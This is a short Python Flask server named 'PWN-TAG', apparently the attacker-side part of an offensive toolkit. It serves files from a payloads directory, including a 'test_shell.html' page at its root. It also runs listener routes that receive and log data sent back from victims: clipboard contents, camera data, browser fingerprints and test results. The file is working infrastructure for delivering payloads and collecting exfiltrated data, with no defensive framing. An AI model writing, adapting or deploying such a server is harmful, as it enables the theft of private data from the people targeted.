from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)
BASE_DIR = os.path.abspath(os.path.dirname(__file__))

# === PAYLOAD FILES ===
@app.route('/payloads/<path:filename>')
def payloads(filename):
    return send_from_directory(os.path.join(BASE_DIR, "payloads"), filename)

# === LISTENER ROUTES ===
@app.route('/testlog', methods=['POST'])
def testlog():
    print(f"[TEST LOG] {request.json}")
    return "ok"

@app.route('/cliplog', methods=['POST'])
def cliplog():
    print(f"[CLIPBOARD] {request.data.decode('utf-8')}")
    return "ok"

@app.route('/camlog', methods=['POST'])
def camlog():
    print(f"[CAMERA] {request.data.decode('utf-8')}")
    return "ok"

@app.route('/result', methods=['POST'])
def result():
    print(f"[RESULT] {request.data.decode('utf-8')}")
    return "ok"

@app.route('/fingerprint', methods=['POST'])
def fingerprint():
    print(f"[FINGERPRINT] {request.json}")
    return "ok"

# === Optional Root Menu or Redirect ===
@app.route('/')
def index():
    return send_from_directory(os.path.join(BASE_DIR, "payloads"), "test_shell.html")

if __name__ == '__main__':
    print("[*] PWN-TAG Flask server running on port 8080...")
    app.run(host='0.0.0.0', port=8080)
